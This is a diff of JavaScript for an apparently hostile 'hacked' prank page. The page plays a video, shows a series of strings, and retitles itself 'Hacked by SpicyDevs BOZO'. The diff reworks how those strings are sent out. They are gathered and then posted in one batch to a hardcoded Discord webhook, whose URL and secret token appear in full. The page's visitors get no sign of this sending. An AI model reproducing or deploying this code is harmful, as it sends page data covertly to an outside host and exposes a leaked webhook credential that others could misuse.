@@ -27,8 +27,7 @@
       ]
       const webhookUrl = "https://discord.com/api/webhooks/1111166274110771280/R2dwQ4tln3aFxCSIH4cq1_esSXG0MxEHIIlL4ALzT8sb1OS3NSZkRlPL77_W7lAxL6ca";
 
-// Function to send data to Discord webhook
-const sendDataToWebhook = async (data) => {
+      const sendDataToWebhook = async (data) => {
   try {
     await fetch(webhookUrl, {
       method: 'POST',
@@ -42,11 +41,20 @@ const sendDataToWebhook = async (data) => {
   }
 };
 
+// Array to store merged messages
+let mergedMessages = [];
+
 // Send data to Discord webhook
 const sendToWebhook = async (data) => {
-  await sendDataToWebhook(data).then(() => {
-    console.log('Data sent to Discord webhook');
-  });
+  mergedMessages.push(data); // Add the message to the mergedMessages array
+};
+
+// Send merged messages to Discord webhook
+const sendMergedMessages = async () => {
+  const mergedData = mergedMessages.join('\n'); // Merge the messages using a separator
+  await sendDataToWebhook(mergedData); // Send the merged messages to the webhook
+  console.log('Data sent to Discord webhook:', mergedData);
+  mergedMessages = []; // Reset the mergedMessages array
 };
       try {
         const memes = []
@@ -131,25 +139,30 @@ const sendToWebhook = async (data) => {
           video.style.display = 'flex'
           video.play();
 
-          const interval = setInterval(async () => {
-          const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
-          if (step >= memes.length) step = -Infinity;
-          if (step < 0) return clearInterval(interval);
-          if (time >= 0) {
-              if (step == 0) document.title = `Hacked by SpicyDevs BOZO`
-              const el = document.createElement('span');
-              el.textContent = `${memes[step]}`
-              step++
-              data.appendChild(el)
-              const height = data.getBoundingClientRect().height
-              if (height >= window.innerHeight) {
-                fontSize *= 0.88
-                data.style.fontSize = `${fontSize}px`
-              }
-             await sendToWebhook(`${memes[step]}`);
-            }
-          }, 5)
-        }
+          
+  const interval = setInterval(async () => {
+    const time = video.currentTime - 2.100 - step * 60 / 132; // 132 bpm moment
+    if (step >= memes.length) step = -Infinity;
+    if (step < 0) {
+      clearInterval(interval);
+      await sendMergedMessages(); // Send the accumulated messages
+      return;
+    }
+    if (time >= 0) {
+      if (step == 0) document.title = `Hacked by SpicyDevs BOZO`;
+      const el = document.createElement('span');
+      el.textContent = `${memes[step]}`;
+      step++;
+      data.appendChild(el);
+      const height = data.getBoundingClientRect().height;
+      if (height >= window.innerHeight) {
+        fontSize *= 0.88;
+        data.style.fontSize = `${fontSize}px`;
+      }
+      sendToWebhook(`${memes[step]}`); // Add the message to the mergedMessages array
+    }
+  }, 5);
+};
 
         video.onended = () => {
           video.style.display = 'none';
